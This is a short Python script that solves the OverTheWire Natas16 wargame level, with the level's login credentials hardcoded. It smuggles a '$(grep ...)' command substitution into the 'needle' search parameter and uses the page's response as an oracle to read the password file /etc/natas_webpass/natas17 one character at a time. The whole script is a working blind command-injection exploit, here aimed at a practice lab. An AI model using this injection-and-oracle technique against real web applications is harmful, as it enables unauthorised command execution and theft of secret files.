#!/usr/bin/python3

# coding : utf-8

import requests
import string

pass_charset = string.ascii_letters + string.digits
NATAS16_URL = "http://natas16.natas.labs.overthewire.org/"
password = ""

session = requests.Session()
session.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

param = {'needle': ''}

while len(password) != 32:
    for c in pass_charset:
        param['needle'] = 'omega$(grep ^'+ password + c + ' /etc/natas_webpass/natas17)'
        res = session.get(NATAS16_URL, params=param)
        if "omega" not in res.text:
            password += c
            print("current pass: {}".format(password))
        else:
            continue
